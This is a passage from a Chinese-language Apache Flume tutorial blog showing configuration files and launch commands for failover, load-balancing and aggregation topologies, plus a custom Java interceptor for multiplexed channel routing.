job/group1/flume-flume-hdfs.conf</span><br><span class="line">bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group1/flume-file-flume.conf</span><br></pre></td></tr></table></figure><h3 id="4-2-负载均衡和故障转移">4.2 负载均衡和故障转移</h3><p>使用 Flume1 监控一个端口，其 sink 组中的 sink 分别对接 Flume2 和 Flume3，采用FailoverSinkProcessor，实现故障转移的功能</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329738.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#flume-sink-processors</span></span><br><span class="line"><span class="comment"># 在/opt/module/flume/job 目录下创建 group2 文件夹</span></span><br><span class="line"><span class="comment"># 配置 1 个 netcat source 和 1 个 channel、1 个 sink group（2 个 sink），分别输送给flume-flume-console1 和 flume-flume-console2</span></span><br><span class="line"><span class="comment"># 创建 flume-netcat-flume.conf</span></span><br><span class="line">vim flume-netcat-flume.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.channels = c1</span><br><span class="line">a1.sinkgroups = g1</span><br><span class="line">a1.sinks = k1 k2</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"></span><br><span class="line">a1.sinkgroups.g1.processor.type = failover</span><br><span class="line">a1.sinkgroups.g1.processor.priority.k1 = 5</span><br><span class="line">a1.sinkgroups.g1.processor.priority.k2 = 10</span><br><span class="line">a1.sinkgroups.g1.processor.maxpenalty = 10000</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = avro</span><br><span class="line">a1.sinks.k1.hostname = hadoop102</span><br><span class="line">a1.sinks.k1.port = 4141</span><br><span class="line">a1.sinks.k2.type = avro</span><br><span class="line">a1.sinks.k2.hostname = hadoop102</span><br><span class="line">a1.sinks.k2.port = 4142</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinkgroups.g1.sinks = k1 k2</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line">a1.sinks.k2.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 flume-flume-console1.conf,配置上级 Flume 输出的 Source，输出是到本地控制台</span></span><br><span class="line">vim flume-flume-console1.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a2.sources = r1</span><br><span class="line">a2.sinks = k1</span><br><span class="line">a2.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a2.sources.r1.type = avro</span><br><span class="line">a2.sources.r1.bind = hadoop102</span><br><span class="line">a2.sources.r1.port = 4141</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a2.sinks.k1.type = logger</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a2.channels.c1.type = memory</span><br><span class="line">a2.channels.c1.capacity = 1000</span><br><span class="line">a2.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a2.sources.r1.channels = c1</span><br><span class="line">a2.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 flume-flume-console2.conf,配置上级 Flume 输出的 Source，输出是到本地控制台</span></span><br><span class="line">vim flume-flume-console2.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a3.sources = r1</span><br><span class="line">a3.sinks = k1</span><br><span class="line">a3.channels = c2</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a3.sources.r1.type = avro</span><br><span class="line">a3.sources.r1.bind = hadoop102</span><br><span class="line">a3.sources.r1.port = 4142</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a3.sinks.k1.type = logger</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a3.channels.c2.type = memory</span><br><span class="line">a3.channels.c2.capacity = 1000</span><br><span class="line">a3.channels.c2.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a3.sources.r1.channels = c2</span><br><span class="line">a3.sinks.k1.channel = c2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别开启对应配置文件：flume-flume-console2，flume-flume-console1，flumenetcat-flume</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group2/flume-flume-console2.conf -Dflume.root.logger=INFO,console</span><br><span class="line">bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group2/flume-flume-console1.conf -Dflume.root.logger=INFO,console</span><br><span class="line">bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group2/flume-netcat-flume.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 netcat 工具向本机的 44444 端口发送内容</span></span><br><span class="line">nc localhost 44444</span><br><span class="line"><span class="comment"># 使用 jps -ml 查看 Flume 进程</span></span><br></pre></td></tr></table></figure><p>如果要换成负载均衡，只需要修改第一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果要改成负载均衡，就变成load_balance</span></span><br><span class="line">a1.sinkgroups = g1</span><br><span class="line">a1.sinkgroups.g1.sinks = k1 k2</span><br><span class="line">a1.sinkgroups.g1.processor.type = load_balance</span><br><span class="line"><span class="comment"># 开启退避</span></span><br><span class="line">a1.sinkgroups.g1.processor.backoff = <span class="literal">true</span></span><br><span class="line"><span class="comment"># 默认 round_robin随机，轮询是sink拉取轮询，不是推轮询</span></span><br><span class="line">a1.sinkgroups.g1.processor.selector = random</span><br><span class="line"><span class="comment"># 退避最大的时间，防止一直退避下去</span></span><br><span class="line">a1.sinkgroups.g1.processor.selector.maxTimeOut = 30000</span><br></pre></td></tr></table></figure><h3 id="4-3-聚合">4.3 聚合</h3><p>hadoop102 上的 Flume-1 监控文件/opt/module/group.log，hadoop103 上的 Flume-2 监控某一个端口的数据流，Flume-1 与 Flume-2 将数据发送给 hadoop104 上的 Flume-3，Flume-3 将最终数据打印到控制台</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329739.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分发 Flume，进入module模块分发</span></span><br><span class="line">xsync flume</span><br><span class="line"><span class="comment"># 在 hadoop102、hadoop103 以及 hadoop104 的/opt/module/flume/job 目录下创建一个group3 文件夹</span></span><br><span class="line">mkdir group3</span><br><span class="line"><span class="comment"># 创建 flume1-logger-flume.conf，配置 Source 用于监控 hive.log 文件，配置 Sink 输出数据到下一级 Flume</span></span><br><span class="line"><span class="comment"># 在 hadoop102 上编辑配置文件</span></span><br><span class="line">vim flume1-logger-flume.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.r1.command = tail -F /opt/module/group.log</span><br><span class="line">a1.sources.r1.shell = /bin/bash -c</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = avro</span><br><span class="line">a1.sinks.k1.hostname = hadoop104</span><br><span class="line">a1.sinks.k1.port = 4141</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 flume2-netcat-flume.conf,配置 Source 监控端口 44444 数据流，配置 Sink 数据到下一级 Flume</span></span><br><span class="line"><span class="comment"># 在 hadoop103 上编辑配置文件</span></span><br><span class="line">vim flume2-netcat-flume.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a2.sources = r1</span><br><span class="line">a2.sinks = k1</span><br><span class="line">a2.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a2.sources.r1.type = netcat</span><br><span class="line">a2.sources.r1.bind = hadoop103</span><br><span class="line">a2.sources.r1.port = 44444</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a2.sinks.k1.type = avro</span><br><span class="line">a2.sinks.k1.hostname = hadoop104</span><br><span class="line">a2.sinks.k1.port = 4141</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a2.channels.c1.type = memory</span><br><span class="line">a2.channels.c1.capacity = 1000</span><br><span class="line">a2.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a2.sources.r1.channels = c1</span><br><span class="line">a2.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 flume3-flume-logger.conf,配置 source 用于接收 flume1 与 flume2 发送过来的数据流，最终合并后 sink 到控制台</span></span><br><span class="line">vim flume3-flume-logger.conf</span><br><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a3.sources = r1</span><br><span class="line">a3.sinks = k1</span><br><span class="line">a3.channels = c1</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a3.sources.r1.type = avro</span><br><span class="line">a3.sources.r1.bind = hadoop104</span><br><span class="line">a3.sources.r1.port = 4141</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a3.sinks.k1.type = logger</span><br><span class="line"><span class="comment"># Describe the channel</span></span><br><span class="line">a3.channels.c1.type = memory</span><br><span class="line">a3.channels.c1.capacity = 1000</span><br><span class="line">a3.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a3.sources.r1.channels = c1</span><br><span class="line">a3.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别开启对应配置文件：flume3-flume-logger.conf，flume2-netcat-flume.conf，flume1-logger-flume.conf</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a3 --conf-file job/group3/flume3-flume-logger.conf -Dflume.root.logger=INFO,console</span><br><span class="line">bin/flume-ng agent --conf conf/ --name a2 --conf-file job/group3/flume1-logger-flume.conf</span><br><span class="line">bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group3/flume2-netcat-flume.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 hadoop103 上向/opt/module 目录下的 group.log 追加内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'hello'</span> &gt; group.log</span><br><span class="line"><span class="comment"># 在 hadoop102 上向 44444 端口发送数据</span></span><br><span class="line">telnet hadoop102 44444</span><br></pre></td></tr></table></figure><h2 id="5、自定义-Interceptor">5、自定义 Interceptor</h2><h3 id="5-1-概述">5.1 概述</h3><p>使用 Flume 采集服务器本地日志，需要按照日志类型的不同，将不同种类的日志发往不同的分析系统</p><p>在实际的开发中，一台服务器产生的日志类型可能有很多种，不同类型的日志可能需要发送到不同的分析系统。此时会用到 Flume 拓扑结构中的 Multiplexing 结构，Multiplexing的原理是，根据 event 中 Header 的某个 key 的值，将不同的 event 发送到不同的 Channel中，所以我们需要自定义一个 Interceptor，为不同类型的 event 的 Header 中的 key 赋予不同的值。</p><p>在该案例中，我们以端口数据模拟日志，以是否包含&quot;atguigu&quot;模拟不同类型的日志，我们需要自定义 interceptor 区分数据中是否包含&quot;atguigu&quot;，将其分别发往不同的分析系统（Channel）</p><p><img src="http://qnypic.shawncoding.top/blog/202401251329740.png" alt></p><h3 id="5-2-官网实现">5.2 官网实现</h3><blockquote><p><a href="https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#multiplexing-channel-selector" target="_blank" rel="noopener" title="https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#multiplexing-channel-selector">https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#multiplexing-channel-selector</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匹配header为state的值,一般需要我们实现拦截器，实现多路复用，只有在source可以使用</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.channels = c1 c2 c3 c4</span><br><span class="line">a1.sources.r1.selector.type = multiplexing</span><br><span class="line">a1.sources.r1.selector.header = state</span><br><span class="line">a1.sources.r1.selector.mapping.CZ = c1</span><br><span class="line">a1.sources.r1.selector.mapping.US = c2 c3</span><br><span class="line">a1.sources.r1.selector.default = c4</span><br></pre></td></tr></table></figure><h3 id="5-3-代码实现">5.3 代码实现</h3><p>创建一个 maven 项目，并引入以下依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flume<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flume-ng-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义 com.atguigu.interceptor.TypeInterceptor.CustomInterceptor 类并实现 Interceptor 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeInterceptor</span> <span class="keyword">implements</span> <span class="title">Interceptor</span> </span>&#123;</span><br><span class="line">    <span class="comment">//声明一个存放事件的集合</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Event&gt; addHeaderEvents;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//初始化存放事件的集合</span></span><br><span class="line">        addHeaderEvents = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//单个事件拦截</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Event <span class="title">intercept</span><span class="params">(Event event)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取事件中的头信息</span></span><br><span class="line">        Map&lt;String, String&gt; headers = event.getHeaders();</span><br><span class="line">        <span class="comment">//2.获取事件中的 body 信息</span></span><br><span class="line">        String body = <span class="keyword">new</span> String(event.getBody());</span><br><span class="line">        <span class="comment">//3.根据 body 中是否有"atguigu"来决定添加怎样的头信息</span></span><br><span class="line">        <span class="keyword">if</span> (body.contains(<span class="string">"atguigu"</span>)) &#123;</span><br><span class="line">            <span class="comment">//4.添加头信息</span></span><br><span class="line">            headers.put(<span class="string">"type"</span>, <span class="string">"first"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//4.添加头信息</span></span><br><span class="line">            headers.put(<span class="string">"type"</span>, <span class="string">"second"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> event;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//批量事件拦截</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Event&gt; <span class="title">intercept</span><span class="params">(List&lt;Event&gt; events)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.清空集合</span></span><br><span class="line">        addHeaderEvents.clear();</span><br><span class="line">        <span class="comment">//2.遍历 events</span></span><br><span class="line">        <span class="keyword">for</span> (Event event : events) &#123;</span><br><span class="line">            <span class="comment">//3.给每一个事件添加头信息</span></span><br><span class="line">            addHeaderEvents.add(intercept(event));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//4.返回结果</span></span><br><span class="line">        <span class="keyword">return</span> addHeaderEvents;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Builder</span> <span class="keyword">implements</span> <span class="title">Interceptor</span>.<span class="title">Builder</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Interceptor <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> TypeInterceptor();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包放入flume/lib目录下，启动时会自动通过反射扫描包</p><p>然后新建job/group4，编辑 flume 配置文件，为 hadoop102 上的 Flume1 配置 1 个 netcat source，1 个 sink group（2 个 avro sink），并配置相应的 ChannelSelector 和 interceptor</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#flume-interceptors</span></span><br><span class="line"><span class="comment"># Name the components on this agent.conf</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1 k2</span><br><span class="line">a1.channels = c1 c2</span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = localhost</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line">a1.sources.r1.interceptors = i1</span><br><span class="line">a1.sources.r1.interceptors.i1.type = com.atguigu.interceptor.TypeInterceptor<span class="variable">$Builder</span></span><br><span class="line">a1.sources.r1.selector.type = multiplexing</span><br><span class="line">a1.sources.r1.selector.header = <span class="built_in">type</span></span><br><span class="line">a1.sources.r1.selector.mapping.first = c1</span><br><span class="line">a1.sources.r1.selector.mapping.second = c2</span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = avro</span><br><span class="line">a1.sinks.k1.hostname = hadoop103</span><br><span class="line">a1.sinks.k1.port = 4141</span><br><span class="line">a1.sinks.k2.type=avro</span><br><span class="line">a1.sinks.k2.hostname = hadoop104</span><br><span class="line">a1.sinks.k2.port = 4242</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c2.type = memory</span><br><span class="line">a1.channels.c2.capacity = 1000</span><br><span class="line">a1.channels.c2.transactionCapacity = 100</span><br><span class="line"><span class="comment"># Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1 c2</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line">a1.sinks.k2.channel = c2</span><br></pre></td></tr></table></figure><p>为 hadoop103 上的 Flume4 配置一个 avro source 和一个 logger sink</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line">a1.sources.r1.type = avro</span><br><span class="line">a1.sources.r1.bind = hadoop103</span><br><span class="line">a1.sources.r1.port = 4141</span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line">a1.sources.r1.channels = c1</span><br></pre></td></tr></table></figure><p>为 hadoop104 上的 Flume3 配置一个 avro source 和一个 logger sink</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line">a1.sources.r1.type = avro</span><br><span class="line">a1.sources.r1.bind = hadoop104</span><br><span class="line">a1.sources.r1.port = 4242</span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line">a1.sources.r1.channels = c1</span><br></pre></td></tr></table></figure><p>启动，先启动103，104，最后启动102</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hadoop103</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group4/flume2.conf -Dflume.root.logger=INFO,console</span><br><span class="line"><span class="comment"># hadoop104</span></span><br><span class="line">bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group4/flume3.conf -Dflume.root.logger=INFO,console</span><br><span class="line">bin/flume-ng agent --conf conf/ --name a1 --conf-file job/group4/flume1.conf</span><br></pre></td></tr></table></figure><h2 id="6、自定义-Source">6、自定义 Source</h2><h3 id="6-1-概述">6.1 概述</h3><blockquote><p>官网给出的source:<a href="https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#flume-sources" target="_blank" rel="noopener" title="https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#flume-sources">https://flume.apache.org/releases/content/1.9.0/FlumeUserGuide.html#flume-sources</a></p></blockquote><p>Source 是负责接收数据到 Flume Agent 的组件。Source 组件可以处理各种类型、各种格式的日志数据，包括 avro、thrift、exec、jms、spooling directory、netcat、sequencegenerator、syslog、http、legacy。官方提供的 source 类型已经很多，但是有时候并不能满足实际开发当中的需求，此时我们就需要根据实际需求自定义某些 source。官方也提供了<a href="https://flume.apache.org/FlumeDeveloperGuide.html#source" target="_blank" 